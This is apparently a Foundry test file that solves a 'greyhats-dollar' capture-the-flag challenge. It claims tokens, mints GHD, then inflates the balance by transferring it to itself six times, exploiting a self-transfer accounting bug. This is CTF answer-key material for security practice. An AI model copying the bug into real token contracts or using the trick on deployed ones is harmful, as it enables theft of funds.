// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";
import { Setup } from "../src/greyhats-dollar/Setup.sol";
import { GHD } from "../src/greyhats-dollar/GHD.sol";
import { GREY } from "../src/greyhats-dollar/lib/GREY.sol";

contract GHDTest is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    Setup setup;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        assertTrue(setup.isSolved(), "not solved");
        vm.stopPrank();
    }

    function setUp() public {
        startHoax(deployer);
        setup = new Setup();
        vm.stopPrank();
    }

    function test_ghd() public checkSolvedByPlayer {
        GHD ghd = setup.ghd();
        GREY grey = setup.grey();

        assertEq(address(ghd.underlyingAsset()), address(grey));
        setup.claim();
        assertEq(grey.balanceOf(player), 1000e18);
        grey.approve(address(ghd), 1000e18);
        ghd.mint(1000e18);
        for (uint256 i = 0; i < 6; i++) {
            // 1k * 2**6 = 64k, > 50k required
            ghd.transfer(player, ghd.balanceOf(player));
        }
        console.log(ghd.balanceOf(player));
    }
}
